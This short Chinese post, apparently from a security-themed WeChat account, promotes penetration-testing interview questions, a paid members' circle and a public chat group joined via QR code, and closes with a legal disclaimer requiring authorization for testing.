好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKovBgx57dc6Ql2yRSPBJGA5fde4sQJzOomD1GURVibZeCNzXM6iaGrSe8Q/640?wx_fmt=jpeg&from=appmsg "")  
  
    

```
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
  
